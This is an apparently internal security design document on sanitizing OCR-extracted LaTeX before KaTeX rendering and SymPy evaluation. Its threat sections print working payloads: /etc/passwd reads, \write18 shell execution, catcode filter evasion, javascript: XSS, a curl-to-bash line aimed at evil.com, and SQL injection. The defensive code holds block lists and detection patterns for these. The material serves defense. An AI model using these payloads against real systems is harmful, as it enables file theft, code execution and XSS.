# Iteration 03 -- LaTeX Sanitization: Code Execution Prevention via Malicious LaTeX

**Date**: 2026-04-12
**Iteration**: 3 of 10
**Focus**: LaTeX injection attack vectors and defense-in-depth sanitization for the Cena student screenshot pipeline
**Security Score Contribution**: 18/100 points (cumulative with iterations 01-02)

---

## 1. Threat Model

### 1.1 Attack Surface

In the Cena platform, students submit photos of handwritten math work. The pipeline is:

```
Student photo --> Gemini 2.5 Flash (OCR) --> LaTeX string --> KaTeX (render) --> SymPy (CAS validate) --> Database (store)
```

Every stage after OCR extraction treats the LaTeX string as data. An attacker who controls the photo controls the LaTeX. The threat model assumes:

- **Attacker**: A student (or someone with a student account) submitting a crafted photo.
- **Goal**: Achieve code execution on the server, exfiltrate data, inject XSS into other users' browsers, cause denial of service, or corrupt the database.
- **Entry point**: A photograph designed so that OCR produces a malicious LaTeX string rather than legitimate math.
- **Trust boundary**: The LaTeX string extracted from the photo is **untrusted input** at every subsequent stage.
- **Amplification**: If an attacker discovers that certain drawn symbols reliably OCR into backslash-commands, they can craft adversarial images that produce specific payloads with high probability.

### 1.2 Downstream Consumers at Risk

| Consumer | Runtime | Risk if unsanitized |
|----------|---------|---------------------|
| KaTeX (browser) | JavaScript in student/teacher browser | XSS, DOM manipulation, phishing |
| KaTeX (SSR) | Node.js on server | Denial of service via infinite loops |
| SymPy sidecar | Python subprocess | Arbitrary code execution via `eval()` |
| MathNet (in-process) | .NET CLR | Lower risk -- compiled parser, no eval |
| PostgreSQL | SQL engine | SQL injection if string is interpolated |
| NATS bus | Message broker | Message format corruption |

---

## 2. Attack Vectors

### 2.1 LaTeX Command Injection

LaTeX is Turing-complete. A full TeX engine allows file I/O, shell execution, and macro programming. These commands are the primary weapons:

**File reading** -- no special flags required in a full TeX engine:

```latex
\input{/etc/passwd}
\include{/etc/shadow}
\lstinputlisting{/etc/passwd}
\verbatiminput{/etc/passwd}
```

Line-by-line file exfiltration:

```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

**Command execution** -- requires `--shell-escape` but attackers probe for it:

```latex
\immediate\write18{id > output}
\input{output}

\immediate\write18{env | base64 > test.tex}
\input{test.tex}
```

Alternative syntax: `\input|ls|base64`

**File writing**:

```latex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```

**Macro redefinition to evade filters**:

```latex
\def\imm{\string\imme}
\def\diate{diate}
```

This reconstructs `\immediate` across compilation passes.

**Category code manipulation** to bypass backslash-based filters:

```latex
\catcode`\X=0
Xinput{/etc/passwd}
```

This makes `X` behave like backslash, turning `Xinput` into `\input`.

**Unicode hex encoding evasion**:

```latex
\lstin^^70utlisting{/etc/passwd}
```

Here `^^70` decodes to `p`, reconstructing `\lstinputlisting`.

**Relevance to Cena**: KaTeX is **not** a full TeX engine. It does not support `\input`, `\write18`, `\newread`, `\catcode`, or any file/shell primitives. However, the sanitizer must still block these because: (a) the LaTeX string may also be forwarded to SymPy which parses it differently, (b) defense in depth requires blocking at the data layer regardless of the renderer, and (c) future pipeline changes might introduce a component that does interpret these commands.

Sources:
- [PayloadsAllTheThings -- LaTeX Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/)
- [Hacking with LaTeX](https://0day.work/hacking-with-latex/)
- [Checkoway & Shacham, "Don't Take LaTeX Files from Strangers" (USENIX 2010)](https://www.usenix.org/system/files/login/articles/73506-checkoway.pdf)

### 2.2 XSS via LaTeX Rendering

KaTeX can produce HTML containing links and images when the `trust` option is enabled:

```latex
\href{javascript:alert(document.cookie)}{Click here}
\url{javascript:alert(1)}
\includegraphics{https://evil.com/tracking.gif}
\htmlClass{evil-class}{content}
```

**CVE-2024-28246** (CVSS 5.5): KaTeX versions before 0.16.10 failed to normalize the `protocol` field in the trust callback context. An attacker could bypass a protocol blocklist by using mixed-case:

```latex
\href{JavaScript:alert(1)}{payload}
\href{JAVASCRIPT:alert(1)}{payload}
```

A trust function checking `context.protocol !== 'javascript'` would pass these through because the protocol string was not lowercased.

**CVE-2024-28243**: The `\edef` command could construct exponentially growing token sequences using only a linear number of macro expansions, bypassing `maxExpand`:

```latex
\edef\a{x}
\edef\a{\a\a}   % 2 tokens
\edef\a{\a\a}   % 4 tokens
\edef\a{\a\a}   % 8 tokens
% ... 30 iterations = 2^30 = 1 billion tokens
```

**CVE-2024-28244**: Unicode sub/superscript characters spawned new Parser instances that reset the expansion counter, bypassing `maxExpand` limits.

Sources:
- [KaTeX Security Advisory GHSA-3wc5-fcw2-2329](https://github.com/KaTeX/KaTeX/security/advisories/GHSA-3wc5-fcw2-2329)
- [KaTeX Security Advisory GHSA-cvr6-37gx-v8wc](https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cvr6-37gx-v8wc)
- [CVE-2024-28246 Analysis](https://ogma.in/cve-2024-28246-understanding-the-katex-url-protocol-bypass-vulnerability-and-mitigation-steps)

### 2.3 SymPy parse_expr Code Execution

SymPy's `sympify()` and `parse_expr()` use Python's `eval()` internally. This is the most critical attack vector in the Cena pipeline because it enables **arbitrary Python code execution** on the server.

**Direct code execution**:

```python
# Attacker crafts LaTeX that OCRs to a string like:
# __import__('os').system('curl evil.com/exfil.sh | bash')
```

**Object model traversal** (classic Python sandbox escape):

```python
# ().__class__.__base__.__subclasses__()
# Enumerates all loaded Python classes -- can find file handlers, etc.
```

**Attribute access for data exfiltration**:

```python
# open('/etc/passwd').read()
```

**Why this works**: `parse_expr` tokenizes the input string, applies transformations, then calls `eval()` with a namespace containing SymPy symbols. But `eval()` still processes Python syntax including attribute access (`.`), function calls, comprehensions, and imports.

**SymPy issue #10805** has been open since 2017 acknowledging this. A proposed `safe=True` flag (PR #12524) that would whitelist AST node types remains unmerged as of 2026.

Sources:
- [SymPy Issue #10805 -- sympify shouldn't use eval](https://github.com/sympy/sympy/issues/10805)
- [SymPy PR #12524 -- Add safe flag to sympify()](https://github.com/sympy/sympy/pull/12524)
- [SymPy parsing documentation](https://docs.sympy.org/latest/modules/parsing.html)

### 2.4 ReDoS via Complex LaTeX Expressions

If any stage uses regex to parse or validate LaTeX, a crafted expression can trigger catastrophic backtracking:

```latex
\frac{\frac{\frac{\frac{\frac{\frac{a}{b}}{c}}{d}}{e}}{f}}{g}

x_{a_{b_{c_{d_{e_{f_{g_{h_{i_{j}}}}}}}}}}
```

**CVE-2023-39663**: MathJax was vulnerable to ReDoS through the `components` pattern in MathJax.js. With 14 crafted characters, the regex engine required over 65,000 steps.

KaTeX itself is not known to be vulnerable to ReDoS because it uses a recursive descent parser rather than regex for its core parsing. However, any regex-based pre-validation layer in Cena's pipeline could be vulnerable.

Sources:
- [MathJax ReDoS -- CVE-2023-39663](https://security.snyk.io/vuln/SNYK-JS-MATHJAX-6210173)
- [OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

### 2.5 Buffer Overflow via Deeply Nested Expressions

Deeply nested LaTeX structures can cause stack overflow in recursive parsers:

```latex
% 1000-level nesting
\sqrt{\sqrt{\sqrt{\sqrt{\sqrt{\sqrt{\sqrt{\sqrt{...}}}}}}}}

% Deep fraction nesting
\frac{1}{\frac{1}{\frac{1}{\frac{1}{...}}}}
```

In KaTeX, this produces deeply nested DOM trees that can crash the browser's rendering engine. In SymPy, deeply nested expression trees can exhaust the Python call stack (default recursion limit: 1000).

**Memory exhaustion** is also possible. SymPy issue #17609 documents expressions that consume 512GB+ RAM:

```
sin((7**(exp(exp(exp(10*E)))))+1)
```

Source:
- [SymPy Issue #17609 -- Out of memory on big expressions](https://github.com/sympy/sympy/issues/17609)

### 2.6 Database Injection via LaTeX Strings Stored in SQL

If the LaTeX string is interpolated into SQL queries without parameterization:

```
x^2 + 3'; DROP TABLE student_answers; --
```

This is a standard SQL injection that happens to arrive via a LaTeX field. The defense is standard parameterized queries, but it must be verified for every query path that touches stored LaTeX.

Additionally, LaTeX strings containing null bytes (`\0`), extremely long strings (>64KB), or Unicode control characters can corrupt database fields or trigger encoding errors.

---

## 3. KaTeX Security Model

### 3.1 What KaTeX Blocks by Default

KaTeX is a math-only renderer, not a full TeX engine. It does **not** implement:

| Blocked by design | Full TeX equivalent |
|-------------------|---------------------|
| File I/O | `\input`, `\include`, `\openin`, `\openout` |
| Shell execution | `\write18`, `\immediate\write18` |
| Category codes | `\catcode` |
| Arbitrary macros | `\def` (limited support), `\newcommand` (limited) |
| Package loading | `\usepackage` |
| Verbatim input | `\verbatiminput`, `\lstinputlisting` |

### 3.2 What Can Leak Through

With `trust: true`, KaTeX permits:

| Command | Risk |
|---------|------|
| `\href{url}{text}` | XSS via `javascript:` protocol |
| `\url{url}` | XSS via `javascript:` protocol |
| `\includegraphics{url}` | SSRF, tracking pixels |
| `\htmlClass{class}` | CSS injection, UI spoofing |
| `\htmlId{id}` | DOM manipulation |
| `\htmlStyle{style}` | CSS injection |
| `\htmlData{data}` | Data attribute injection |

With `trust: false` (default), all of the above render in `errorColor` (red) and produce no active HTML.

### 3.3 Known CVEs (2024)

| CVE | CVSS | Issue | Fixed in |
|-----|------|-------|----------|
| CVE-2024-28243 | 6.5 | `\edef` exponential token blowup bypasses `maxExpand` | 0.16.10 |
| CVE-2024-28244 | 6.5 | Unicode sub/superscripts bypass `maxExpand` | 0.16.10 |
| CVE-2024-28245 | 6.5 | XSS via `\includegraphics` with trust enabled | 0.16.10 |
| CVE-2024-28246 | 5.5 | Protocol case bypass in trust callback | 0.16.10 |

**Minimum safe version: KaTeX >= 0.16.10**

Sources:
- [KaTeX Security Documentation](https://katex.org/docs/security)
- [KaTeX Options Documentation](https://katex.org/docs/options.html)
- [KaTeX GitHub Security Advisories](https://github.com/KaTeX/KaTeX/security)

---

## 4. SymPy Security

### 4.1 The eval() Problem

SymPy's `parse_expr()` ultimately calls Python's `eval()`. The documentation explicitly warns: *"This function uses eval, and thus shouldn't be used on unsanitized input."*

The call chain is:

```
parse_expr(string)
  -> tokenize(string)
  -> apply transformations
  -> eval(transformed_string, global_dict, local_dict)
```

The `global_dict` defaults to `from sympy import *` and `local_dict` is empty. This means any valid Python expression that resolves against SymPy's namespace will be executed.

### 4.2 parse_expr with Transformations

Transformations modify the token stream before `eval()`. The standard transformations are:

- `lambda_notation` -- converts lambda syntax
- `auto_symbol` -- converts unknown identifiers to Symbol objects
- `auto_number` -- converts numeric literals to SymPy numbers
- `factorial_notation` -- converts `x!` to `factorial(x)`
- `repeated_decimals` -- handles repeating decimal notation

Custom transformations can add implicit multiplication (`2x` -> `2*x`) or function application (`sin x` -> `sin(x)`).

**Transformations do not provide security.** They operate on the token stream before `eval()` but do not restrict what `eval()` can execute.

### 4.3 Restricted Evaluation Mode (Defense Implementation)

Since SymPy has no built-in safe mode, Cena must implement its own. The approach is **AST validation before eval**:

```python
import ast
from typing import Set

# Whitelist of safe AST node types for math expressions
SAFE_AST_NODES: Set[type] = {
    ast.Module,
    ast.Expression,
    ast.Expr,
    ast.BinOp,
    ast.UnaryOp,
    ast.Call,
    ast.Name,
    ast.Load,
    ast.Constant,    # Numeric and string literals
    ast.Tuple,       # For function arguments
    ast.List,        # For matrix construction
    ast.Add,
    ast.Sub,
    ast.Mult,
    ast.Div,
    ast.FloorDiv,
    ast.Mod,
    ast.Pow,
    ast.USub,        # Unary minus
    ast.UAdd,        # Unary plus
    ast.Compare,     # For equations: Eq(x, 1)
    ast.Eq,
    ast.NotEq,
    ast.Lt,
    ast.LtE,
    ast.Gt,
    ast.GtE,
    ast.Starred,     # For *args in function calls
}

# Functions that are safe to call
SAFE_FUNCTIONS: Set[str] = {
    # SymPy constructors
    'Symbol', 'symbols', 'Integer', 'Rational', 'Float',
    'pi', 'E', 'I', 'oo', 'nan',
    # Arithmetic
    'sqrt', 'cbrt', 'root', 'Abs', 'sign',
    'factorial', 'binomial', 'gcd', 'lcm',
    # Trigonometric
    'sin', 'cos', 'tan', 'cot', 'sec', 'csc',
    'asin', 'acos', 'atan', 'atan2', 'acot', 'asec', 'acsc',
    'sinh', 'cosh', 'tanh', 'coth', 'sech', 'csch',
    'asinh', 'acosh', 'atanh', 'acoth', 'asech', 'acsch',
    # Exponential and logarithmic
    'exp', 'log', 'ln', 'log2', 'log10',
    # Powers
    'Pow', 'pow',
    # Calculus
    'diff', 'integrate', 'limit', 'summation', 'product',
    'Derivative', 'Integral', 'Limit', 'Sum', 'Product',
    # Linear algebra
    'Matrix', 'det', 'transpose',
    # Equation solving
    'Eq', 'Ne', 'Lt', 'Le', 'Gt', 'Ge',
    'solve', 'simplify', 'expand', 'factor',
    # Special
    'Piecewise', 'Max', 'Min', 'floor', 'ceiling',
    'Fraction', 'Rational',
}

# Explicitly blocked identifiers
BLOCKED_NAMES: Set[str] = {
    'eval', 'exec', 'compile', 'execfile',
    '__import__', 'import', '__builtins__',
    'open', 'file', 'input', 'raw_input',
    'globals', 'locals', 'vars', 'dir',
    'getattr', 'setattr', 'delattr', 'hasattr',
    'type', 'isinstance', 'issubclass',
    'classmethod', 'staticmethod', 'property',
    'super', 'object',
    'os', 'sys', 'subprocess', 'shutil',
    'pathlib', 'importlib', 'pickle', 'shelve',
    'socket', 'http', 'urllib', 'requests',
    'sympify',  # Prevent re-entry into eval
}


class MathExpressionValidator(ast.NodeVisitor):
    """Validates that a Python AST contains only safe math operations."""

    def __init__(self) -> None:
        self.errors: list[str] = []

    def visit(self, node: ast.AST) -> None:
        if type(node) not in SAFE_AST_NODES:
            self.errors.append(
                f"Disallowed AST node: {type(node).__name__}"
            )
            return  # Do not descend into disallowed nodes
        self.generic_visit(node)

    def visit_Name(self, node: ast.Name) -> None:
        if node.id in BLOCKED_NAMES:
            self.errors.append(f"Blocked identifier: {node.id}")
        if node.id.startswith('_'):
            self.errors.append(
                f"Underscore-prefixed identifier blocked: {node.id}"
            )
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call) -> None:
        if isinstance(node.func, ast.Name):
            if node.func.id not in SAFE_FUNCTIONS:
                self.errors.append(
                    f"Disallowed function call: {node.func.id}"
                )
        elif isinstance(node.func, ast.Attribute):
            # Block all attribute access: obj.method()
            self.errors.append(
                "Attribute access in function call is blocked"
            )
        else:
            self.errors.append(
                "Complex function call expression blocked"
            )
        # Still validate arguments
        for arg in node.args:
            self.visit(arg)
        for kw in node.keywords:
            self.visit(kw.value)

    def visit_Attribute(self, node: ast.Attribute) -> None:
        # Block ALL attribute access -- this is the primary sandbox escape
        self.errors.append(
            f"Attribute access blocked: .{node.attr}"
        )


def validate_math_expression(expr_string: str) -> tuple[bool, list[str]]:
    """
    Validate that a string contains only safe math operations.

    Returns (is_safe, list_of_errors).
    """
    # Pre-checks before AST parsing
    if len(expr_string) > 2000:
        return False, ["Expression exceeds maximum length (2000 chars)"]

    if '\x00' in expr_string:
        return False, ["Null bytes not permitted"]

    # Check for obvious attack patterns before parsing
    dangerous_patterns = [
        '__', 'import', 'eval(', 'exec(', 'open(',
        'getattr', 'setattr', 'globals', 'locals',
        'compile(', '.system', '.popen', 'subprocess',
    ]
    expr_lower = expr_string.lower()
    for pattern in dangerous_patterns:
        if pattern in expr_lower:
            return False, [f"Dangerous pattern detected: {pattern}"]

    try:
        tree = ast.parse(expr_string, mode='eval')
    except SyntaxError as e:
        return False, [f"Syntax error: {e}"]

    validator = MathExpressionValidator()
    validator.visit(tree)

    return len(validator.errors) == 0, validator.errors
```

### 4.4 Timeout Enforcement

Every SymPy evaluation must be wrapped in a timeout to prevent denial-of-service:

```python
import multiprocessing
from typing import Any, Optional


class EvaluationTimeout(Exception):
    """Raised when math evaluation exceeds time limit."""
    pass


def _evaluate_in_process(
    expr_string: str,
    result_queue: multiprocessing.Queue,
    timeout_seconds: int,
) -> None:
    """Run evaluation in a subprocess with resource limits."""
    import resource

    # Limit memory to 256MB in the subprocess
    mem_limit = 256 * 1024 * 1024
    resource.setrlimit(resource.RLIMIT_AS, (mem_limit, mem_limit))

    try:
        from sympy.parsing.sympy_parser import (
            parse_expr,
            standard_transformations,
            implicit_multiplication_application,
        )

        transformations = (
            standard_transformations
            + (implicit_multiplication_application,)
        )

        # Restricted namespace -- no builtins
        safe_globals = {"__builtins__": {}}

        # Import only safe SymPy functions into namespace
        import sympy
        for name in SAFE_FUNCTIONS:
            if hasattr(sympy, name):
                safe_globals[name] = getattr(sympy, name)

        result = parse_expr(
            expr_string,
            local_dict={},
            global_dict=safe_globals,
            transformations=transformations,
        )
        result_queue.put(("ok", str(result)))
    except Exception as e:
        result_queue.put(("error", str(e)))


def safe_sympy_evaluate(
    expr_string: str,
    timeout_seconds: int = 5,
) -> tuple[bool, str]:
    """
    Evaluate a math expression safely with SymPy.

    1. Validates AST before evaluation.
    2. Runs evaluation in a subprocess with memory limits.
    3. Enforces a hard timeout.

    Returns (success, result_or_error).
    """
    # Step 1: AST validation
    is_safe, errors = validate_math_expression(expr_string)
    if not is_safe:
        return False, f"Validation failed: {'; '.join(errors)}"

    # Step 2: Evaluate in isolated subprocess
    result_queue: multiprocessing.Queue = multiprocessing.Queue()
    process = multiprocessing.Process(
        target=_evaluate_in_process,
        args=(expr_string, result_queue, timeout_seconds),
    )
    process.start()
    process.join(timeout=timeout_seconds)

    if process.is_alive():
        process.terminate()
        process.join(timeout=2)
        if process.is_alive():
            process.kill()
        return False, f"Evaluation timed out after {timeout_seconds}s"

    if result_queue.empty():
        return False, "Evaluation produced no result"

    status, value = result_queue.get_nowait()
    return status == "ok", value
```

---

## 5. Defense Implementation

### 5.1 LaTeX Allowlist Parser (TypeScript -- Pre-KaTeX Layer)

This parser runs **before** KaTeX rendering and **before** SymPy evaluation. It validates that the LaTeX string contains only permitted math commands.

```typescript
/**
 * LaTeX sanitizer for the Cena screenshot pipeline.
 * Validates that a LaTeX string contains only safe math commands.
 *
 * Design principle: ALLOWLIST, not blocklist.
 * If a command is not explicitly permitted, it is rejected.
 */

// --- Allowlist of safe LaTeX commands ---

const ALLOWED_COMMANDS: ReadonlySet<string> = new Set([
  // Greek letters (lowercase)
  'alpha', 'beta', 'gamma', 'delta', 'epsilon', 'varepsilon',
  'zeta', 'eta', 'theta', 'vartheta', 'iota', 'kappa',
  'lambda', 'mu', 'nu', 'xi', 'omicron', 'pi', 'varpi',
  'rho', 'varrho', 'sigma', 'varsigma', 'tau', 'upsilon',
  'phi', 'varphi', 'chi', 'psi', 'omega',

  // Greek letters (uppercase)
  'Gamma', 'Delta', 'Theta', 'Lambda', 'Xi', 'Pi',
  'Sigma', 'Upsilon', 'Phi', 'Psi', 'Omega',

  // Binary operators
  'times', 'div', 'cdot', 'pm', 'mp', 'ast', 'star',
  'circ', 'bullet', 'oplus', 'otimes', 'odot',

  // Relations
  'leq', 'le', 'geq', 'ge', 'neq', 'ne', 'approx', 'equiv',
  'sim', 'simeq', 'cong', 'propto', 'parallel', 'perp',
  'subset', 'supset', 'subseteq', 'supseteq', 'in', 'notin',
  'ni', 'mid', 'nmid',

  // Arrows
  'leftarrow', 'rightarrow', 'leftrightarrow',
  'Leftarrow', 'Rightarrow', 'Leftrightarrow',
  'longleftarrow', 'longrightarrow', 'longleftrightarrow',
  'mapsto', 'longmapsto', 'to',
  'uparrow', 'downarrow', 'updownarrow',

  // Delimiters
  'left', 'right', 'langle', 'rangle', 'lfloor', 'rfloor',
  'lceil', 'rceil', 'lbrace', 'rbrace', 'lvert', 'rvert',
  'lVert', 'rVert',

  // Math structures
  'frac', 'dfrac', 'tfrac', 'cfrac',
  'sqrt', 'root',
  'sum', 'prod', 'coprod',
  'int', 'iint', 'iiint', 'oint',
  'lim', 'limsup', 'liminf',
  'max', 'min', 'sup', 'inf',
  'log', 'ln', 'lg', 'exp',
  'sin', 'cos', 'tan', 'cot', 'sec', 'csc',
  'arcsin', 'arccos', 'arctan', 'arccot',
  'sinh', 'cosh', 'tanh', 'coth',
  'det', 'dim', 'ker', 'hom', 'deg',
  'gcd', 'lcm', 'arg', 'mod', 'pmod', 'bmod',

  // Accents and decorations
  'hat', 'bar', 'vec', 'dot', 'ddot', 'tilde', 'widetilde',
  'widehat', 'overline', 'underline', 'overbrace', 'underbrace',
  'overrightarrow', 'overleftarrow',

  // Spacing
  'quad', 'qquad', 'enspace', 'thinspace', 'negthickspace',
  'negthinspace', 'negmedspace',

  // Formatting
  'text', 'textbf', 'textit', 'textrm', 'textsf', 'texttt',
  'mathbf', 'mathit', 'mathrm', 'mathsf', 'mathtt',
  'mathcal', 'mathbb', 'mathfrak', 'mathscr',
  'boldsymbol', 'bold',
  'displaystyle', 'textstyle', 'scriptstyle', 'scriptscriptstyle',

  // Layout
  'begin', 'end', 'hspace', 'vspace', 'phantom', 'hphantom',
  'vphantom', 'smash', 'rlap', 'llap',
  'stackrel', 'overset', 'underset', 'atop',

  // Matrices and arrays
  'matrix', 'pmatrix', 'bmatrix', 'Bmatrix', 'vmatrix', 'Vmatrix',
  'array', 'cases', 'aligned', 'gathered', 'split',
  'align', 'equation', 'multline',

  // Misc symbols
  'infty', 'partial', 'nabla', 'forall', 'exists', 'nexists',
  'emptyset', 'varnothing', 'therefore', 'because',
  'ldots', 'cdots', 'vdots', 'ddots',
  'aleph', 'beth', 'hbar', 'ell', 'wp', 'Re', 'Im',
  'imath', 'jmath',

  // Set theory and logic
  'cup', 'cap', 'setminus', 'land', 'lor', 'lnot', 'neg',
  'implies', 'iff', 'vee', 'wedge',

  // Sizing
  'big', 'Big', 'bigg', 'Bigg', 'bigl', 'Bigl', 'bigr', 'Bigr',
  'bigm', 'Bigm', 'biggl', 'Biggl', 'biggr', 'Biggr',

  // Colors (safe subset)
  'color', 'textcolor', 'colorbox',

  // Misc
  'binom', 'dbinom', 'tbinom', 'choose',
  'not', 'cancel', 'bcancel', 'xcancel', 'cancelto',
  'boxed', 'tag', 'notag',
  'operatorname',
]);

// --- Environments allowed inside \begin{...}\end{...} ---

const ALLOWED_ENVIRONMENTS: ReadonlySet<string> = new Set([
  'matrix', 'pmatrix', 'bmatrix', 'Bmatrix', 'vmatrix', 'Vmatrix',
  'array', 'cases', 'aligned', 'gathered', 'split',
  'align', 'align*', 'equation', 'equation*', 'multline', 'multline*',
  'smallmatrix', 'subarray',
]);

// --- Complexity limits ---

interface ComplexityLimits {
  maxLength: number;
  maxDepth: number;
  maxCommands: number;
  maxSubscriptDepth: number;
}

const DEFAULT_LIMITS: ComplexityLimits = {
  maxLength: 2000,
  maxDepth: 20,
  maxCommands: 200,
  maxSubscriptDepth: 6,
};

// --- Result types ---

interface SanitizationResult {
  safe: boolean;
  sanitized: string;
  errors: string[];
  metrics: {
    length: number;
    commandCount: number;
    maxDepth: number;
    processingTimeMs: number;
  };
}

// --- The sanitizer ---

export function sanitizeLatex(
  input: string,
  limits: ComplexityLimits = DEFAULT_LIMITS,
): SanitizationResult {
  const startTime = performance.now();
  const errors: string[] = [];
  let commandCount = 0;

  // --- Pre-checks ---

  if (!input || typeof input !== 'string') {
    return {
      safe: false,
      sanitized: '',
      errors: ['Input is empty or not a string'],
      metrics: { length: 0, commandCount: 0, maxDepth: 0,
                 processingTimeMs: performance.now() - startTime },
    };
  }

  if (input.length > limits.maxLength) {
    errors.push(
      `Expression length ${input.length} exceeds limit ${limits.maxLength}`
    );
    return {
      safe: false, sanitized: '', errors,
      metrics: { length: input.length, commandCount: 0, maxDepth: 0,
                 processingTimeMs: performance.now() - startTime },
    };
  }

  if (input.includes('\0')) {
    errors.push('Null bytes are not permitted');
    return {
      safe: false, sanitized: '', errors,
      metrics: { length: input.length, commandCount: 0, maxDepth: 0,
                 processingTimeMs: performance.now() - startTime },
    };
  }

  // Unicode control character check (except normal whitespace)
  const controlCharRegex = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/;
  if (controlCharRegex.test(input)) {
    errors.push('Control characters are not permitted');
    return {
      safe: false, sanitized: '', errors,
      metrics: { length: input.length, commandCount: 0, maxDepth: 0,
                 processingTimeMs: performance.now() - startTime },
    };
  }

  // Unicode sub/superscript character check (CVE-2024-28244)
  const unicodeSubSuperRegex =
    /[\u2070-\u209F\u00B2\u00B3\u00B9\u2080-\u208E]/;
  if (unicodeSubSuperRegex.test(input)) {
    errors.push(
      'Unicode sub/superscript characters blocked (CVE-2024-28244)'
    );
  }

  // --- Command extraction and validation ---

  const commandRegex = /\\([a-zA-Z]+|[^a-zA-Z\s])/g;
  let match: RegExpExecArray | null;

  while ((match = commandRegex.exec(input)) !== null) {
    const command = match[1];
    commandCount++;

    if (commandCount > limits.maxCommands) {
      errors.push(
        `Command count ${commandCount} exceeds limit ${limits.maxCommands}`
      );
      break;
    }

    if (!ALLOWED_COMMANDS.has(command)) {
      if (command.length === 1) {
        continue; // Single-char escapes like \, \; \! are safe
      }
      errors.push(`Disallowed command: \\${command}`);
    }
  }

  // --- Environment validation ---

  const envRegex = /\\begin\{([^}]+)\}/g;
  while ((match = envRegex.exec(input)) !== null) {
    const envName = match[1];
    if (!ALLOWED_ENVIRONMENTS.has(envName)) {
      errors.push(`Disallowed environment: ${envName}`);
    }
  }

  // --- Nesting depth check ---

  let depth = 0;
  let maxDepth = 0;
  let subscriptDepth = 0;
  let maxSubscriptDepth = 0;

  for (let i = 0; i < input.length; i++) {
    const ch = input[i];
    if (ch === '{') {
      depth++;
      if (depth > maxDepth) maxDepth = depth;
      if (depth > limits.maxDepth) {
        errors.push(
          `Nesting depth ${depth} exceeds limit ${limits.maxDepth}`
        );
        break;
      }
    } else if (ch === '}') {
      depth = Math.max(0, depth - 1);
    } else if (ch === '_' || ch === '^') {
      if (i + 1 < input.length && input[i + 1] === '{') {
        subscriptDepth++;
        if (subscriptDepth > maxSubscriptDepth) {
          maxSubscriptDepth = subscriptDepth;
        }
        if (subscriptDepth > limits.maxSubscriptDepth) {
          errors.push(
            `Subscript/superscript depth ${subscriptDepth} exceeds limit`
          );
        }
      }
    }
  }

  // --- Dangerous pattern checks (defense in depth) ---

  const dangerousPatterns: Array<[RegExp, string]> = [
    [/\\(input|include)\b/i, 'File inclusion command'],
    [/\\(write|openout|openin|newwrite|newread|closein|closeout)\b/i,
     'File I/O command'],
    [/\\(immediate|write18)\b/i, 'Shell execution command'],
    [/\\catcode\b/i, 'Category code manipulation'],
    [/\\(def|edef|gdef|xdef|let)\b/i, 'Macro definition command'],
    [/\\(usepackage|documentclass|RequirePackage)\b/i, 'Package loading'],
    [/\\(url|href|includegraphics)\b/i, 'URL/resource inclusion'],
    [/\\(htmlClass|htmlId|htmlStyle|htmlData)\b/i, 'HTML attribute injection'],
    [/\\(verb|verbatim|lstinputlisting|verbatiminput)\b/i, 'Verbatim input'],
    [/\\(csname|endcsname)\b/i, 'Dynamic command construction'],
    [/\\(expandafter|noexpand|the|meaning)\b/i, 'Token manipulation'],
    [/\\(loop|repeat)\b/i, 'Loop construct'],
    [/javascript\s*:/i, 'JavaScript protocol in URL'],
    [/data\s*:/i, 'Data protocol in URL'],
    [/vbscript\s*:/i, 'VBScript protocol in URL'],
  ];

  for (const [pattern, description] of dangerousPatterns) {
    if (pattern.test(input)) {
      errors.push(`Dangerous pattern: ${description}`);
    }
  }

  const processingTimeMs = performance.now() - startTime;

  return {
    safe: errors.length === 0,
    sanitized: errors.length === 0 ? input : '',
    errors,
    metrics: {
      length: input.length,
      commandCount,
      maxDepth,
      processingTimeMs,
    },
  };
}
```

### 5.2 KaTeX Hardened Configuration (TypeScript)

```typescript
import katex from 'katex';

/**
 * Hardened KaTeX configuration for the Cena platform.
 *
 * Security invariants:
 * - trust: false -- no URL, image, or HTML attribute commands
 * - maxExpand: 100 -- prevent macro bombs (default 1000 is too generous)
 * - maxSize: 20 -- cap visual element size to 20em
 * - strict: "error" -- reject non-standard LaTeX features
 * - throwOnError: false -- render errors in red, do not crash the page
 */

interface CenaKatexOptions {
  displayMode?: boolean;
  throwOnError?: boolean;
}

export function renderMathSafe(
  latex: string,
  options: CenaKatexOptions = {},
): string {
  // Pre-sanitize before passing to KaTeX
  const sanitizationResult = sanitizeLatex(latex);
  if (!sanitizationResult.safe) {
    const errorMsg = sanitizationResult.errors.join('; ');
    return '<span class="math-error" title="' + escapeHtml(errorMsg) + '">'
      + '<span class="math-error-icon" aria-label="Invalid expression">'
      + '[invalid math]</span></span>';
  }

  try {
    return katex.renderToString(sanitizationResult.sanitized, {
      // --- Security options ---
      trust: false,              // Block \href, \url, \includegraphics, etc.
      maxExpand: 100,            // Limit macro expansions (CVE-2024-28243/28244)
      maxSize: 20,               // Cap element sizes to 20em
      strict: 'error',           // Reject non-standard features

      // --- Rendering options ---
      displayMode: options.displayMode ?? false,
      throwOnError: false,       // Render errors visibly, do not throw
      errorColor: '#cc0000',

      // --- Output ---
      output: 'htmlAndMathml',   // Include MathML for screen readers
    });
  } catch (_err) {
    // KaTeX should not throw with throwOnError:false,
    // but defense in depth:
    return '<span class="math-error">[render error]</span>';
  }
}

function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

### 5.3 Expression Complexity Limits

| Dimension | Limit | Rationale |
|-----------|-------|-----------|
| String length | 2,000 chars | No legitimate student math expression exceeds this |
| Brace nesting depth | 20 levels | `\frac{\frac{...}{...}}{...}` rarely exceeds 10 in real use |
| Subscript/superscript depth | 6 levels | Tensor notation rarely exceeds 4 |
| Command count | 200 | A full page of math is typically under 100 commands |
| KaTeX maxExpand | 100 | Prevents macro bombs while allowing reasonable macros |
| KaTeX maxSize | 20 em | Prevents layout-breaking oversized elements |
| SymPy eval timeout | 5 seconds | No legitimate CAS operation takes longer for student-level math |
| SymPy memory limit | 256 MB | Prevents memory exhaustion attacks |
